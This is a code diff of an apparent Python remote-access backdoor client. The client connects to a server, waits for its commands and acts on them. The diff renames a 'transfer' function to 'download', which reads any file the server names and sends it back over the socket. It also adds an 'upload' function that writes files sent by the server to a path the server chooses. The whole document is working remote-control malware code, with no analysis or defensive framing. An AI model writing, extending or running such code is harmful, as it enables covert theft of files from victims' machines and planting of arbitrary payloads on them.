@@ -9,7 +9,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((SERVER_HOST, SERVER_PORT))
 print("[+] Connected to server")
 
-def transfer(from_):
+def download(from_):
     from_ = s.recv(1024).decode()
     file = open(from_, 'rb')
     a = file.read(4096)
@@ -20,14 +20,30 @@ def transfer(from_):
     s.send(b"\n\r")
     file.close()
 
+def upload():
+    path = s.recv(4096).decode()
+    if not path.endswith('\\'):
+        path += '\\'
+    file_name = s.recv(4096).decode()
+    path += file_name
+    file = open(path, 'ab')
+    a = s.recv(4096)
+    while a != b"\n\r":
+        file.write(a)
+        a = s.recv(4096)
+    file.close()
+    print("File sent succesfully!")
+
 while 1:
     command = s.recv(409600).decode()
     print(command)
     command = command.split()
 
     match command[0]:
-        case 'transfer':
-            transfer(from_= command[1])
+        case 'download':
+            download(from_= command[1])
+        case 'upload':
+            upload()
 
 
 
